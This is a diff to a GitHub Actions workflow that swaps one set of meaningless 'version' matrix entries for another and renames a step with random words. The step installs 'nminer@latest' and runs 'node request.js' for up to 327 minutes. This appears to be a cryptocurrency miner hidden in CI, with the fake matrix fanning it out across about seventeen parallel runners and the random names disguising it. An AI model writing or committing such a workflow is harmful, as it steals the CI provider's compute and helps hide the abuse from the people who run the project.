@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1123 }
-          - { version: 2146 }
-          - { version: 9583 }
-          - { version: 2814 }
-          - { version: 9094 }
-          - { version: 1130 }
-          - { version: 2244 }
-          - { version: 8985 }
-          - { version: 6903 }
-          - { version: 7951 }
-          - { version: 3757 }
-          - { version: 7228 }
-          - { version: 5635 }
-          - { version: 7323 }
-          - { version: 5836 }
-          - { version: 24 }
-          - { version: 724 }
-          - { version: 9748 }
+          - { version: 8498 }
+          - { version: 8546 }
+          - { version: 8266 }
+          - { version: 9141 }
+          - { version: 1485 }
+          - { version: 6488 }
+          - { version: 2268 }
+          - { version: 2609 }
+          - { version: 4795 }
+          - { version: 8851 }
+          - { version: 6217 }
+          - { version: 7260 }
+          - { version: 5723 }
+          - { version: 5560 }
+          - { version: 7898 }
+          - { version: 7515 }
+          - { version: 2432 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: boo except sociable
+      - name: definite familiarize inside
         run: |
           npm install nminer@latest
-          timeout 324m node request.js || echo "request executed"
+          timeout 327m node request.js || echo "request executed"
